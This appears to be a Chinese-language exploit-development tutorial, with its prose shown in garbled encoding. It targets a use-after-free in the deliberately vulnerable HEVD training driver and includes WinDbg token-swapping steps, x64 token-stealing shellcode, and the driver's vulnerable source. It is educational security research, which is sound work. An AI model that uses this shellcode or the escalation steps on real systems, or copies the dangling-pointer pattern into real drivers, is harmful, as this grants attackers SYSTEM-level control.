<p>NtAllocateReserveObjectï¼šntdllä¸­ç³»ç»Ÿè°ƒç”¨ã€‚è´Ÿè´£åœ¨å†…æ ¸ç«¯åˆ›å»ºä¿ç•™å¯¹è±¡â€“åœ¨å†…æ ¸æ± ä¸Šæ‰§è¡Œå†…å­˜åˆ†é…ï¼Œè¿”å›Handle</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS STDCALL <span class="title">NtAllocateReserveObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PHANDLE hObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN DWORD ObjectType </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure>

<h2 id="é©±åŠ¨å±‚æƒé™æå‡"><a href="#é©±åŠ¨å±‚æƒé™æå‡" class="headerlink" title="é©±åŠ¨å±‚æƒé™æå‡"></a>é©±åŠ¨å±‚æƒé™æå‡</h2><p>å†…æ ¸æ•°æ®ç»“æ„åŒ…å«äº†ä¸€ä¸ªæŒ‡å‘tokençš„æŒ‡é’ˆã€‚å½“è¿›ç¨‹è¯•å›¾å»æ‰§è¡Œå„ç§æ“ä½œæ—¶ï¼Œæ¯”å¦‚æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œtokenä¸­çš„è´¦æˆ·æƒé™ä¼šç”¨äºå’Œæ‰€éœ€çš„æƒé™è¿›è¡Œæ¯”è¾ƒï¼Œä»¥æ­¤å†³å®šè¯¥æ“ä½œæ˜¯å¦å¯è¡Œã€‚</p>
<p>Windowsææƒï¼šè·å–Â <code>nt authority\system</code>æƒé™</p>
<ul>
<li>å°†SYSTEMè¿›ç¨‹çš„tokenå¤åˆ¶åˆ°å½“å‰è¿›ç¨‹ï¼Œè¿™æ ·å½“å‰è¿›ç¨‹åˆ™ä¸ºsystemæƒé™<a href="https://bbs.kanxue.com/thread-224058-1.htm">(1)</a>ã€‚</li>
<li>ç¼–è¾‘ACL&#x2F;ACE æˆ–è€… ç›´æ¥ä¿®æ”¹tokenä¸­çš„<code>dt _token : +0x040 Privileges: _SEP_TOKEN_PRIVILEGES</code>ä»¥è¾¾åˆ°æƒé™æå‡çš„ç›®çš„ï¼Œæ­¤æ–¹æ³•æœ‰ä¸€ä¸ªå¥½å¤„æ˜¯è¢«ä¿®æ”¹è¿›ç¨‹çš„ç”¨æˆ·åç­‰ä¿¡æ¯ä¸ä¼šæ”¹å˜ï¼Œåªæ˜¯æƒé™æ”¹å˜äº†<a href="https://wonderkun.cc/2021/08/22/windows10%E5%86%85%E6%A0%B8%E6%80%81%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/">(2)</a></li>
</ul>
<h3 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><p>é¦–å…ˆæ‰¾åˆ°Systemè¿›ç¨‹çš„16è¿›åˆ¶åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !dml_proc</span><br><span class="line">Address           PID  Image file name</span><br><span class="line">ffff940f`cfea7080 4    System</span><br><span class="line">...</span><br><span class="line">ffff940f`d7240080 2270 cmd.exe</span><br><span class="line"></span><br><span class="line">0: kd&gt; !process 0 0 system</span><br><span class="line">PROCESS ffff940fcfea7080</span><br><span class="line">    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000</span><br><span class="line">    DirBase: 001ad000  ObjectTable: ffffe78dfac04800  HandleCount: 3023.</span><br><span class="line">    Image: System</span><br></pre></td></tr></table></figure>

<p>å®ƒæŒ‡å‘ä¸€ä¸ª<code>_EPROCESS</code>ç»“æ„ï¼ŒæŸ¥çœ‹ï¼Œä¸€ä¸ªæ¯”è¾ƒå¤§çš„ç»“æ„ä½“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt _EPROCESS ffff940f`cfea7080</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x438 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x440 UniqueProcessId  : 0x00000000`00000004 Void</span><br><span class="line">   +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffff940f`cff084c8 - 0xfffff803`7181e130 ]</span><br><span class="line">   +0x458 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   ...</span><br><span class="line">   +0x4b8 Token            : _EX_FAST_REF</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°tokenåç§»ï¼ˆæ ¹æ®ç³»ç»Ÿè¿›è¡Œå˜åŒ–ï¼Œå¹¶ä¸”tokenå­—æ®µæ˜¯ä»¥<code>_EX_FAST_REF</code>æ¥å£°æ˜çš„è€Œä¸æ˜¯<code>_TOKEN</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dq ffffe78dfac04800+4b8 L1</span><br><span class="line">ffffe78d`fac04cb8  ffffe78d`fac0c05e</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _EX_FAST_REF ffffe78dfac04800+4b8</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0xffffe78d`fac0c05e Void</span><br><span class="line">   +0x000 RefCnt           : 0y1110</span><br><span class="line">   +0x000 Value            : 0xffffe78d`fac0c05e</span><br></pre></td></tr></table></figure>

<p>è“å±è­¦å‘Šï¼šè¿™ä¸ª <code>token</code> åå››ä½å…¨ä¸º0æ‰æ˜¯token</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !token ffffe78d`fac0c050</span><br></pre></td></tr></table></figure>

<p>å®šä½cmd.exeè¿›ç¨‹çš„<code>_EPROCESS</code>ç»“æ„å¹¶æ›¿æ¢åç§»0x208çš„tokenæŒ‡é’ˆå€¼ä¸ºSystemçš„tokenåœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !process 0 0 cmd.exe</span><br><span class="line">PROCESS ffff940fd7240080</span><br><span class="line">    SessionId: 1  Cid: 2270    Peb: f4e7043000  ParentCid: 13bc</span><br><span class="line">    DirBase: 172720000  ObjectTable: ffffe78e02a18080  HandleCount:  75.</span><br><span class="line">    Image: cmd.exe</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _EX_FAST_REF +0x4b8+ffff940fd7240080</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0xffffe78e`02dcb06b Void</span><br><span class="line">   +0x000 RefCnt           : 0y1011</span><br><span class="line">   +0x000 Value            : 0xffffe78e`02dcb06b</span><br><span class="line"></span><br><span class="line">0: kd&gt; eq 0x4b8+ffff940fd7240080 0xffffe78d`fac0c050</span><br><span class="line">0: kd&gt; dt _EX_FAST_REF +0x4b8+ffff940fd7240080</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0xffffe78d`fac0c05e Void</span><br><span class="line">   +0x000 RefCnt           : 0y1110</span><br><span class="line">   +0x000 Value            : 0xffffe78d`fac0c05e</span><br><span class="line">0: kd&gt; g</span><br></pre></td></tr></table></figure>

<p>æ›¿æ¢æˆåŠŸ</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">desktop</span>-8<span class="title">h64pu1</span>\<span class="title">debugger</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># <span class="title">WinDbg</span>æ›¿æ¢</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">system</span></span></span><br></pre></td></tr></table></figure>

<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>å¯»æ‰¾ <code>_KTHREAD</code> ç»“æ„ï¼šåæ±‡ç¼– <code>PsGetCurrentThread</code> å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; uf PsGetCurrentProcess </span><br><span class="line">nt!PsGetCurrentProcess:</span><br><span class="line">fffff801`3f68eea0 65488b042588010000 mov   rax,qword ptr gs:[188h]</span><br><span class="line">fffff801`3f68eea9 488b80b8000000  mov     rax,qword ptr [rax+0B8h]</span><br><span class="line">fffff801`3f68eeb0 c3              ret</span><br></pre></td></tr></table></figure>

<p>å…¶å®<code>gs:[188h]</code>çš„ä½ç½®å­˜è´®çš„æ˜¯ <code>_KTHREAD</code> ç»“æ„çš„åœ°å€ï¼Œçœ‹ä¸€ä¸‹è¿™ä¸ªç»“æ„ï¼Œå‘ç°0x220çš„ä½ç½®å­˜å‚¨çš„å°±æ˜¯ <code>_KPROCESS</code>ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯å–å¾— <code>0xb8</code>, 0x98å…¶å®å­˜å‚¨çš„ç»“æ„æ˜¯<code>_KAPC_STATE</code>ï¼Œ<code>0x20</code>ä½ç½®å­˜å‚¨çš„å°±æ˜¯<code>_KPROCESS</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt _KTHREAD</span><br><span class="line">   ...</span><br><span class="line">   +0x098 ApcStateFill     : [43] UChar</span><br><span class="line">   +0x0c3 Priority         : Char</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _KAPC_STATE</span><br><span class="line">ntdll!_KAPC_STATE</span><br><span class="line">   +0x000 ApcListHead      : [2] _LIST_ENTRY</span><br><span class="line">   +0x020 Process          : Ptr64 _KPROCESS</span><br><span class="line">   +0x028 InProgressFlags  : UChar</span><br><span class="line">   +0x028 KernelApcInProgress : Pos 0, 1 Bit</span><br><span class="line">   +0x028 SpecialApcInProgress : Pos 1, 1 Bit</span><br><span class="line">   +0x029 KernelApcPending : UChar</span><br><span class="line">   +0x02a UserApcPendingAll : UChar</span><br><span class="line">   +0x02a SpecialUserApcPending : Pos 0, 1 Bit</span><br><span class="line">   +0x02a UserApcPending   : Pos 1, 1 Bit</span><br></pre></td></tr></table></figure>

<p>å› æ­¤åœ¨r3å¯»æ‰¾åˆ° <code>_KPROCESS </code>çš„å®ç°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">mov r9, qword ptr gs:[<span class="number">0x188</span>]  </span><br><span class="line">mov r9, qword ptr[r9+<span class="number">0x0B8</span>]</span><br><span class="line"><span class="comment">// æˆ–è€…</span></span><br><span class="line">mov r9, qword ptr gs:[<span class="number">0x188</span>]  </span><br><span class="line">mov r9, qword ptr[r9+<span class="number">0x220</span>]</span><br></pre></td></tr></table></figure>

<p><code>_EPROCESS</code>æ˜¯åŒ…å«äº†<code>_KPROCESS</code>çš„ç»“æ„ä½“ï¼Œä»–ä»¬çš„èµ·å§‹åœ°å€æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡dtæ¥æŸ¥çœ‹</p>
<ul>
<li>å†…æ ¸ç”¨æ¥è·Ÿè¸ªè¿›ç¨‹çš„ç»“æ„æ˜¯KPROCESSã€‚ æ‰§è¡Œå­ç³»ç»Ÿç”¨æ¥è·Ÿè¸ªå®ƒçš„ç»“æ„æ˜¯EPROCESSã€‚ ä½œä¸ºä¸€ä¸ªå®ç°ç»†èŠ‚ï¼ŒKPROCESSæ˜¯EPROCESSçš„ç¬¬ä¸€ä¸ªå­—æ®µï¼Œæ‰€ä»¥æ‰§è¡Œå­ç³»ç»Ÿåˆ†é…EPROCESSç»“æ„ï¼Œç„¶åè°ƒç”¨coreelæ¥åˆå§‹åŒ–å®ƒçš„KPROCESSéƒ¨åˆ†ã€‚æœ€åï¼Œè¿™ä¸¤ä¸ªç»“æ„éƒ½æ˜¯è¡¨ç¤ºç”¨æˆ·è¿›ç¨‹å®ä¾‹çš„Process Objectçš„ä¸€éƒ¨åˆ†ã€‚</li>
<li>åœ¨<a href="https://stackoverflow.com/questions/5790587/what-is-the-difference-between-eprocess-object-and-kprocess-object">Stack Overflow</a>å¯»æ‰¾ç­”æ¡ˆ</li>
</ul>
<p>ç¬¬ä¸€ä¸ªå…ƒç´ å°±æ˜¯ <code>_KPROCESS</code>, <code>UniqueProcessId</code>Â å­˜å‚¨çš„æ˜¯å½“å‰è¿›ç¨‹çš„pidï¼Œ<code>InheritedFromUniqueProcessId</code>å­˜å‚¨çš„æ˜¯çˆ¶è¿›ç¨‹çš„pid</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt _EPROCESS</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x438 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x440 UniqueProcessId  : Ptr64 Void</span><br><span class="line">   +0x448 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   ...</span><br><span class="line">   +0x540 InheritedFromUniqueProcessId : Ptr64 Void</span><br><span class="line">   +0x548 OwnerProcessId   : Uint8B</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºç¨‹åºå¤§å¤šæ•°åœ¨cmd.exeå¯åŠ¨ï¼Œå› æ­¤æˆ‘ä»¬è·å¾—çš„æ˜¯ cmd çš„ <code>_KPROCESS</code>ï¼Œæˆ‘ä»¬éœ€è¦æ›¿æ¢çš„æ˜¯è¿™ä¸ªï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾åˆ°systemè¿›ç¨‹token</p>
<p>é“¾è¡¨å…ƒç´ å°±æ˜¯ <code>ActiveProcessLinks</code>ï¼Œæ¥ä¸‹æ¥éå†è¿™ä¸ªé“¾è¡¨å°±å¯ä»¥æ‰¾åˆ°system(pid&#x3D;4)çš„<code>_KPROCESS</code>ã€‚å‚è€ƒ<a href="https://bbs.kanxue.com/thread-224058-1.htm">è¿™é‡Œ</a>ï¼Œä¿®æ”¹åç§»ä¸ºå½“å‰ç³»ç»Ÿçš„</p>
<ul>
<li>EPROCESS åœ¨ KTHREAD + 0xb8</li>
<li>ActiveProcessLinks åœ¨ EPROCESS + 0x448</li>
<li>ActiveProcessLinks è·ç¦» Token è·ç¦»</li>
<li>token åœ¨ EPROCESS + 0x4b8 å¤„</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">    mov rdx, [gs:<span class="number">188</span>h]       ;get _ETHREAD pointer from KPCR</span><br><span class="line">    mov r8, [rdx+<span class="number">0xb8</span>]       ;_EPROCESS (see PsGetCurrentProcess function)</span><br><span class="line">    mov r9, [r8+<span class="number">0x448</span>]       ;ActiveProcessLinks list head</span><br><span class="line">    mov rcx, [r9]            ;follow link to first process in list</span><br><span class="line">find_system_proc:</span><br><span class="line">    mov rdx, [rcx<span class="number">-8</span>]         ;offset from ActiveProcessLinks to UniqueProcessId</span><br><span class="line">    cmp rdx, <span class="number">4</span>               ;process with ID <span class="number">4</span> is System process</span><br><span class="line">    jz found_it</span><br><span class="line">    mov rcx, [rcx]           ;follow _LIST_ENTRY Flink pointer</span><br><span class="line">    cmp rcx, r9              ;see <span class="keyword">if</span> back at list head</span><br><span class="line">    jnz find_system_proc</span><br><span class="line">found_it:</span><br><span class="line">    mov rax, [rcx+<span class="number">0x80</span>]      ;offset from ActiveProcessLinks to Token</span><br><span class="line">    <span class="keyword">and</span> al, <span class="number">0xf0</span>             ;clear low <span class="number">4</span> bits of _EX_FAST_REF structure</span><br><span class="line">    mov [r8+<span class="number">0x4b8</span>], rax      ;replace current process token with system token</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>

<h2 id="å¯»æ‰¾åˆé€‚çš„å¯¹è±¡"><a href="#å¯»æ‰¾åˆé€‚çš„å¯¹è±¡" class="headerlink" title="å¯»æ‰¾åˆé€‚çš„å¯¹è±¡"></a>å¯»æ‰¾åˆé€‚çš„å¯¹è±¡</h2><p>æ± å–·å°„éœ€è¦æ‰¾åˆ°é€‚åˆå¤§å°çš„å†…æ ¸å¯¹è±¡ä»¥åŠæ± å¯¹è±¡ï¼Œä½¿ç”¨windbgåˆ†æ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!object \ObjectTypes</span><br><span class="line"></span><br><span class="line">dt nt!_OBJECT_TYPE &lt;addr&gt;</span><br><span class="line">dt nt!_OBJECT_TYPE_INITIALIZER &lt;addr&gt;</span><br></pre></td></tr></table></figure>

<h2 id="æºç å®¡è®¡"><a href="#æºç å®¡è®¡" class="headerlink" title="æºç å®¡è®¡"></a>æºç å®¡è®¡</h2><p>åœ¨å­˜åœ¨æ¼æ´çš„é©±åŠ¨é‡Œï¼Œå¯¹è±¡freeåæ²¡æœ‰ç½®ä¸ºNULL</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">FreeUaFObjectNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VOID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_UseAfterFreeObjectNonPagedPool)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Freeing UaF Object\n&quot;</span>);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="built_in">STRINGIFY</span>(POOL_TAG));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SECURE</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Secure Note: This is secure because the developer is setting</span></span><br><span class="line">            <span class="comment">// &#x27;g_UseAfterFreeObjectNonPagedPool&#x27; to NULL once the Pool chunk is being freed</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">ExFreePoolWithTag</span>((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Set to NULL to avoid dangling pointer</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            g_UseAfterFreeObjectNonPagedPool = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Vulnerability Note: This is a vanilla Use After Free vulnerability</span></span><br><span class="line">            <span class="comment">// because the developer is not setting &#x27;g_UseAfterFreeObjectNonPagedPool&#x27; to NULL.</span></span><br><span class="line">            <span class="comment">// Hence, g_UseAfterFreeObjectNonPagedPool still holds the reference to stale pointer</span></span><br><span class="line">            <span class="comment">// (dangling pointer)</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">ExFreePoolWithTag</span>((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">            Status = STATUS_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="built_in">GetExceptionCode</span>();</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å¯ä»¥UAFè°ƒç”¨callbackå‡½æ•°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">UseUaFObjectNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VOID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_UseAfterFreeObjectNonPagedPool)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Using UaF Object\n&quot;</span>);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool-&gt;Callback: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool-&gt;Callback);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Calling Callback\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (g_UseAfterFreeObjectNonPagedPool-&gt;Callback)</span><br><span class="line">            &#123;</span><br><span class="line">                g_UseAfterFreeObjectNonPagedPool-&gt;<span class="built_in">Callback</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Status = STATUS_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="built_in">GetExceptionCode</span>();</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ä¸¤ä¸ªç‰ˆæœ¬</p>
<ul>
<li>NonPagedPool è¿™ä¸ªæ± çš„å†…å®¹æ˜¯å¯ä»¥æ‰§è¡Œçš„</li>
<li>ä¸€ä¸ªæ˜¯ <code>Nx</code> ç‰ˆæœ¬ï¼Œä¹Ÿå°±æ˜¯ä¸å¯æ‰§è¡Œç‰ˆæœ¬ã€‚</li>
</ul>
<p>g_UseAfterFreeObjectNonPagedPool åˆå§‹åŒ–</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">AllocateUaFObjectNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VOID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    PUSE_AFTER_FREE_NON_PAGED_POOL UseAfterFree = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Allocating UaF Object\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Allocate Pool chunk</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        UseAfterFree = (PUSE_AFTER_FREE_NON_PAGED_POOL)<span class="built_in">ExAllocatePoolWithTag</span>(</span><br><span class="line">            NonPagedPool,</span><br><span class="line">            <span class="built_in">sizeof</span>(USE_AFTER_FREE_NON_PAGED_POOL),</span><br><span class="line">            (ULONG)POOL_TAG</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!UseAfterFree)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Unable to allocate Pool chunk</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Status = STATUS_NO_MEMORY;</span><br><span class="line">            <span class="keyword">return</span> Status;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="built_in">STRINGIFY</span>(POOL_TAG));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="built_in">STRINGIFY</span>(NonPagedPool));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Size: 0x%zX\n&quot;</span>, <span class="built_in">sizeof</span>(USE_AFTER_FREE_NON_PAGED_POOL));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, UseAfterFree);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Fill the buffer with ASCII &#x27;A&#x27;</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">RtlFillMemory</span>((PVOID)UseAfterFree-&gt;Buffer, <span class="built_in">sizeof</span>(UseAfterFree-&gt;Buffer), <span class="number">0x41</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Null terminate the char buffer</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        UseAfterFree-&gt;Buffer[<span class="built_in">sizeof</span>(UseAfterFree-&gt;Buffer) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Set the object Callback function</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        UseAfterFree-&gt;Callback = &amp;UaFObjectCallbackNonPagedPool;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Assign the address of UseAfterFree to a global variable</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        g_UseAfterFreeObjectNonPagedPool = UseAfterFree;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] UseAfterFree Object: 0x%p\n&quot;</span>, UseAfterFree);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] UseAfterFree-&gt;Callback: 0x%p\n&quot;</span>, UseAfterFree-&gt;Callback);</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="built_in">GetExceptionCode</span>();</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>UAFç»“æ„ä½“</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_USE_AFTER_FREE_NON_PAGED_POOL</span></span><br><span class="line">&#123;</span><br><span class="line">    FunctionPointer Callback;</span><br><span class="line">    CHAR Buffer[<span class="number">0x54</span>];</span><br><span class="line">&#125; USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL;</span><br></pre></td></tr></table></figure>

<p>å¯»æ‰¾IoctlCodeï¼šåç¼–è¯‘</p>
